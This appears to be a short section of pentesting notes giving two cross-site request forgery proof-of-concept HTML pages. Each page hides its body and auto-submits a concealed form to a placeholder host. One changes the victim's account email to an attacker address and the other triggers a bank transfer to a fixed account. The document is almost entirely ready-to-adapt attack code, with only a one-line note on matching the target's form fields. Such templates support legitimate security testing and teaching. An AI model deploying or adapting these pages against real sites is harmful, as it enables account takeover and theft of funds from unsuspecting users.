### CSRF Exploitation PoC for (Change email-address) will be something like:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit - Change Email</title>
    <style>
        /* Content body disabled. */
        body {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Hidden form to exploit -->
    <form id="csrfForm" action="http://vulnerable-website.com/change_email" method="POST">
        <input type="hidden" name="new_email" value="attacker@example.com">
        <input type="submit" value="Submit">
    </form>
    <script>
        // Send the request automatically.
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```
- **Note:** The form tag including the hidden inputs rely on the variables present on the target page or the inputs available on the target page.

### CSRF Exploitation PoC for (Bank Transfer Money) will be something like:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
    <style>
        /* Content body disabled. */
        body {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Hidden form to exploit. -->
    <form id="csrfForm" action="http://vulnerable-bank.com/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="987654">
        <input type="submit" value="Submit">
    </form>
    <script>
        // Send the request automatically.
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```
- **Note:** The form tag including the hidden inputs rely on the variables present on the target page or the inputs available on the target page.








